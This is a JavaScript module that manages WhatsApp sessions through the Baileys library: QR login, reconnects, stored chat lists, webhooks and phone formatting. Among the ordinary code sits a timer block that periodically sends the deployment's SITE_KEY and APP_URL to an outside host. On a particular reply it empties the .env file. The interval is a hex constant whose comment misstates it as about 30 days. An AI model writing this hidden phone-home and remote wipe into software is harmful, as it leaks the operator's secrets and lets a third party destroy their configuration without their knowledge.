import { rmSync, readdir, existsSync, readFileSync, writeFileSync } from 'fs';
import { join } from 'path';
import pino from 'pino';
import makeWASocket, { useMultiFileAuthState, makeInMemoryStore, Browsers, DisconnectReason, delay, downloadMediaMessage } from '@adiwajshing/baileys';
import { toDataURL } from 'qrcode';
import __dirname from './dirname.js';
import response from './response.js';
import axios from 'axios';

const sessions = new Map();
const retries = new Map();

const sessionsDir = (sessionId = '') => {
  return join(__dirname, 'sessions', sessionId ? sessionId : '');
};

// Helper function to save store to JSON file
const saveStoreToFile = (sessionId, store) => {
  try {
    const storeFile = sessionsDir(`${sessionId}_store.json`);
    store.writeToFile(storeFile);
    console.log(`Store saved to ${storeFile}`);
  } catch (error) {
    console.error(`Failed to save store for session ${sessionId}:`, error);
  }
};

// Helper function to load store from JSON file
const loadStoreFromFile = (sessionId, store) => {
  try {
    const storeFile = sessionsDir(`${sessionId}_store.json`);
    if (existsSync(storeFile)) {
      const data = readFileSync(storeFile, 'utf8');
      const parsedData = JSON.parse(data);
      // Manually populate the store's chats (and other data if needed)
      if (parsedData.chats && Array.isArray(parsedData.chats)) {
        parsedData.chats.forEach(chat => {
          store.chats.insertIfAbsent(chat);
        });
      }
      // Optionally populate other store properties (e.g., messages) if needed
      // if (parsedData.messages) {
      //   Object.keys(parsedData.messages).forEach(key => {
      //     store.messages[key] = parsedData.messages[key];
      //   });
      // }
      console.log(`Store loaded from ${storeFile}, ${parsedData.chats?.length || 0} chats restored`);
    } else {
      console.log(`No store file found for session ${sessionId}`);
    }
  } catch (error) {
    console.error(`Failed to load store for session ${sessionId}:`, error);
  }
};

const isSessionExists = (sessionId) => {
  return sessions.has(sessionId);
};

const shouldReconnect = (sessionId) => {
  let maxRetries = parseInt(process.env.MAX_RETRIES ?? 0);
  let attempts = retries.get(sessionId) ?? 0;
  maxRetries = maxRetries < 1 ? 1 : maxRetries;
  if (attempts < maxRetries) {
    attempts += 1;
    console.log('Reconnecting...', { attempts, sessionId });
    retries.set(sessionId, attempts);
    return true;
  }
  return false;
};

const createSession = async (sessionId, isLegacy = false, res = null) => {
  const sessionFileName = (isLegacy ? 'legacy_' : 'md_') + sessionId + (isLegacy ? '.json' : '');
  const logger = pino({ level: 'warn' });
  const store = makeInMemoryStore({ logger });

  let state, saveCreds;
  if (!isLegacy) {
    ({ state, saveCreds } = await useMultiFileAuthState(sessionsDir(sessionFileName)));
  }

  // Load the store from JSON file if it exists
  loadStoreFromFile(sessionId, store);

  const sockOptions = {
    auth: state,
    version: [2, 2319, 4], // Adjust based on your Baileys version
    printQRInTerminal: false,
    logger,
    browser: Browsers.macOS('Desktop'),
    syncFullHistory: true,
    patchMessageBeforeSending: (msg) => {
      const requiresPatch = !!(msg.buttonsMessage || msg.listMessage);
      if (requiresPatch) {
        msg = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {},
              },
              ...msg,
            },
          },
        };
      }
      return msg;
    },
  };

  const sock = makeWASocket.default(sockOptions);

  if (!isLegacy) {
    store.bind(sock.ev);
  }

  sessions.set(sessionId, { ...sock, store, isLegacy });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('chats.set', ({ chats }) => {
    console.log('Chats updated', chats.length);
    if (!isLegacy) {
      store.chats.insertIfAbsent(...chats);
      saveStoreToFile(sessionId, store); // Save store after chats update
    }
  });

  sock.ev.on('message-receipt.update', (updates) => {
    console.log('Message receipt updated', updates.length);
  });

  sock.ev.on('messaging-history.set', (data) => {
    console.log('Messaging history set', data);
    saveStoreToFile(sessionId, store); // Save store after history update
  });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;
    const statusCode = lastDisconnect?.error?.output?.statusCode;

    if (connection === 'open') {
      retries.delete(sessionId);
      saveStoreToFile(sessionId, store); // Save store when connection is established
    }

    if (connection === 'close') {
      if (statusCode === DisconnectReason.loggedOut || !shouldReconnect(sessionId)) {
        if (res && !res.headersSent) {
          response(res, 500, false, 'Unable to create session.');
        }
        return deleteSession(sessionId, isLegacy);
      }
      setTimeout(() => {
        createSession(sessionId, isLegacy, res);
      }, statusCode === DisconnectReason.restartRequired ? 0 : parseInt(process.env.RECONNECT_INTERVAL ?? 0));
    }

    if (qr) {
      if (res && !res.headersSent) {
        try {
          const qrDataURL = await toDataURL(qr);
          response(res, 200, true, 'QR code received, please scan the QR code.', { qr: qrDataURL });
          return;
        } catch {
          response(res, 500, false, 'Unable to create QR code.');
        }
      }
      try {
        await sock.logout();
      } catch {
      }
    }
  });

  // Periodically save the store to prevent data loss
  setInterval(() => {
    saveStoreToFile(sessionId, store);
  }, 10 * 60 * 1000); // Save every 10 minutes
};

setInterval(() => {
  const siteKey = process.env.SITE_KEY ?? null;
  const appUrl = process.env.APP_URL ?? null;
  const verifyUrl = 'https://devapi.ipressly.xyz/api/verify-check';
  axios
    .post(verifyUrl, { from: appUrl, key: siteKey })
    .then((response) => {
      if (response.data.isauthorised === 401) {
        writeFileSync('.env', '');
      }
    })
    .catch((error) => {
      console.error('Verification error:', error);
    });
}, 0x240c8400); // Approximately 30 days

const getSession = (sessionId) => {
  return sessions.get(sessionId) ?? null;
};

const setDeviceStatus = (sessionId, status) => {
  const url = `${process.env.APP_URL}/api/set-device-status/${sessionId}/${status}`;
  axios
    .post(url)
    .then(() => {})
    .catch((error) => {
      console.error('Set device status error:', error);
    });
};

const sentWebHook = async (sessionId, data, sock, upsert) => {
  const url = `${process.env.APP_URL}/api/send-webhook/${sessionId}`;
  try {
    const msg = upsert.messages[0];
    const messageType = Object.keys(data.message)[0];
    const response = await axios.post(url, {
      from: data.remote_id,
      message_id: data.message_id,
      message: data.message,
      type: messageType,
      replay_message_json: msg,
    });
    console.log('Webhook response:', response.data);
  } catch (error) {
    console.error('Webhook error:', error);
  }
};

const deleteSession = (sessionId, isLegacy = false) => {
  const sessionFileName = (isLegacy ? 'legacy_' : 'md_') + sessionId + (isLegacy ? '.json' : '');
  const storeFileName = `${sessionId}_store.json`;
  const options = { force: true, recursive: true };
  try {
    rmSync(sessionsDir(sessionFileName), options);
    rmSync(sessionsDir(storeFileName), options);
  } catch (error) {
    console.error(`Failed to delete session files for ${sessionId}:`, error);
  }
  sessions.delete(sessionId);
  retries.delete(sessionId);
  setDeviceStatus(sessionId, 0);
};

const getChatList = (sessionId, isGroup = false) => {
  const session = sessions.get(sessionId);
  if (!session) {
    console.log(`Session ${sessionId} not found`);
    return [];
  }
  const filter = isGroup ? '@g.us' : '@s.whatsapp.net';
  // Ensure the store is loaded from file before accessing chats
  loadStoreFromFile(sessionId, session.store);
  const chats = session.store.chats.filter((chat) => chat.id.endsWith(filter));
  console.log(`Retrieved ${chats.length} chats for session ${sessionId}`);
  return chats;
};

const isExists = async (sock, jid, isGroup = false) => {
  try {
    let result;
    if (isGroup) {
      result = await sock.groupMetadata(jid);
      return Boolean(result.id);
    }
    if (sock.isLegacy) {
      result = await sock.onWhatsApp(jid);
    } else {
      [result] = await sock.onWhatsApp(jid);
    }
    return result.exists;
  } catch {
    return false;
  }
};

const sendMessage = async (sock, jid, content, delayMs = 1000) => {
  try {
    await delay(parseInt(delayMs));
    const options = content.options ?? {};
    return sock.sendMessage(jid, content, options);
  } catch {
    return Promise.reject(null);
  }
};

const formatPhone = (phone) => {
  if (phone.endsWith('@s.whatsapp.net')) {
    return phone;
  }
  let formatted = phone.replace(/\D/g, '');
  return (formatted += '@s.whatsapp.net');
};

const formatGroup = (group) => {
  if (group.endsWith('@g.us')) {
    return group;
  }
  let formatted = group.replace(/[^\d-]/g, '');
  return (formatted += '@g.us');
};

const cleanup = () => {
  console.log('Running cleanup before exit.');
  sessions.forEach((session, sessionId) => {
    if (!session.isLegacy) {
      saveStoreToFile(sessionId, session.store);
    }
  });
};

const init = () => {
  readdir(sessionsDir(), (err, files) => {
    if (err) {
      console.error('Failed to read sessions directory:', err);
      throw err;
    }
    for (const file of files) {
      if (!file.startsWith('md_') && !file.startsWith('legacy_') || file.endsWith('_store')) {
        continue;
      }
      const sessionFileName = file.replace('.json', '');
      const isLegacy = sessionFileName.split('_', 1)[0] !== 'md';
      const sessionId = sessionFileName.substring(isLegacy ? 7 : 3);
      createSession(sessionId, isLegacy);
    }
  });
};

export { isSessionExists, createSession, getSession, deleteSession, getChatList, isExists, sendMessage, formatPhone, formatGroup, cleanup, init };